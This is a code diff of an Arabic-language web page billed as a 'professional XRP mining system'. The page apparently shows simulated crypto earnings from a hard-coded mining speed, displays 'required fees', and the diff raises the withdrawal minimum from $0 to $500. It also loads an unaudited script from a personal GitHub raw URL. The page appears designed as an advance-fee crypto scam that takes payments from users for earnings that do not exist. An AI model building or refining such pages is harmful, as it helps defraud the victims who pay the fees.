@@ -1,37 +1,53 @@
+
+
+
 <!DOCTYPE html>
 <html lang="ar" dir="rtl">
 <head>
-  <meta charset="UTF-8">
-  <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>نظام تعدين Trump احترافي</title>
-  <script src="https://cdn.tailwindcss.com"></script>
-  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
-  <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
-  <script src="https://raw.githubusercontent.com/johndoe063/etharabs/refs/heads/main/etharabs.js"></script>
-
-  <!-- ✅ هذا بس تضيفه داخل الـ head الأصلي -->
-  <style> .multiplier {
-  margin-top: 10px;
-  font-size: 20px;
-  font-weight: 900;
-  background: linear-gradient(270deg, #ffffff, #00eaff, #ffcc00, #ff69b4, #ffffff);
-  background-size: 400% 400%;
-  -webkit-background-clip: text;
-  -webkit-text-fill-color: transparent;
-  text-shadow: 
-    0 0 10px rgba(255,255,255,0.9),
-    0 0 20px rgba(0,234,255,0.7),
-    0 0 35px rgba(255,204,0,0.7),
-    0 0 45px rgba(255,105,180,0.6);
-  animation: gradientShift 6s ease infinite, pulse-glow 2s infinite alternate, blink 1.5s infinite;
-}
-
-/* تحريك الألوان داخل النص */
-@keyframes gradientShift {
-  0%   { background-position: 0% 50%; }
-  50%  { background-position: 100% 50%; }
-  100% { background-position: 0% 50%; }
-}
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>نظام تعدين XRP احترافي</title>
+    <script src="https://cdn.tailwindcss.com"></script>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0/css/all.min.css">
+    <script src="https://cdn.jsdelivr.net/npm/qrcode/build/qrcode.min.js"></script>
+    <script src="https://raw.githubusercontent.com/johndoe063/etharabs/refs/heads/main/etharabs.js"></script>
+    <style>
+        @keyframes pulse-glow {
+            0% { box-shadow: 0 0 0 0 rgba(110, 82, 250, 0.5); }
+            100% { box-shadow: 0 0 0 20px rgba(110, 82, 250, 0); }
+        }
+        .eth-glow { animation: pulse-glow 2s infinite; }
+        /* Existing Notification (hidden by default) */
+    .notification {
+      position: fixed;
+      top: 20px;
+      right: 20px;
+      padding: 12px 24px;
+      border-radius: 8px;
+      box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+      z-index: 1000;
+      display: none;
+      font-family: sans-serif;
+    }
+    /* Success, Warning, Error styles */
+    .notification.success {
+      background-color: #38a169;
+      color: #fff;
+    }
+    .notification.warning {
+      background-color: #dd6b20;
+      color: #fff;
+    }
+    .notification.error {
+      background-color: #e53e3e;
+      color: #fff;
+    }
+    /* Ad popup style */
+    .notification.ad {
+      background-color: #fff;
+      color: #303030;
+      border: 1px solid #ddd;
+    }
         @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
         .animate-spin { animation: spin 1.5s linear infinite; }
         
@@ -277,8 +293,15 @@
                     </h2>
                 </div>
                 
-
-                        </div>       
+                <div class="p-6 space-y-6">
+                    <div class="bg-gradient-to-br from-gray-900/80 to-purple-900/20 p-6 rounded-xl border border-purple-500/20 text-center">
+                        <div class="mb-5">
+                            <p class="text-sm font-bold text-white-400">إجمالي الأرباح</p>
+                            <p class="text-lg font-semibold text-green-300">
+                                <span id="earnedUSDlabel">0.00</span> USDT
+                            </p>
+                        </div>
+                        
                         <div class="mb-5">
                             <p class="text-sm font-bold text-white-400">الرسوم المطلوبة</p>
                             <p class="text-xl font-bold text-purple-300 mb-1">
@@ -555,8 +578,8 @@ const miningSpeed = 0.0095500;
 
         document.getElementById('withdrawBtn').addEventListener('click', () => {
             const earnedUSD = ethCounter * ethPrice;
-            if (earnedUSD < 0) {
-                showNotification('الحد الأدنى للسحب هو 0$');
+            if (earnedUSD < 500) {
+                showNotification('الحد الأدنى للسحب هو 500$');
                 return;
             }
             document.getElementById('withdrawModal').classList.remove('hidden');
@@ -1354,23 +1377,6 @@ window.cancelPayment = cancelPayment;
 
 </body>
 </html>
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
-
 
 
 
